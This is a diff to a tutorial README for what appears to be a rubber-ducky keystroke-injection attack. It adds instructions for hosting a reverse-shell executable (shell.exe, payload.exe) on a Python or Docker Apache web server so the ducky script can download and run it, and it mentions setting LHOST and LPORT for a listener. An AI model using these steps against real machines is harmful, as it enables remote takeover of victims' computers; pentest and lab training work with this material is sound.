@@ -24,9 +24,36 @@ Change the LHOST and LPORT to your own listener server.
 
 ## 2- ducky script and execute
 
-Within your linux box navigate to the shell.exe location. I'm using a Python webserver to host the executable so I can use this URL in the script to download the exe file:
+**Option 1: Simple Python Webserver**
 
-`python3 -m http.server 80`
+Navigate to the directory containing shell.exe and run:
+
+```
+python3 -m http.server 8080
+```
+
+**Option 2: Docker + Apache Webserver**
+
+Create a lightweight Apache container and map your executable folder:
+
+```
+docker create --name webserver \
+  -p 8080:80 \
+  -v [PATH-TO-FOLDER-WITH-EXECUTABLE]:/usr/local/apache2/htdocs:ro \
+  httpd:2.4-alpine
+```
+
+Then start the container:
+
+```
+docker start webserver
+```
+
+Now you can access the file at:
+
+```
+http://<server-ip>:8080/payload.exe
+```
 
 Next, change the variables in the script:
 
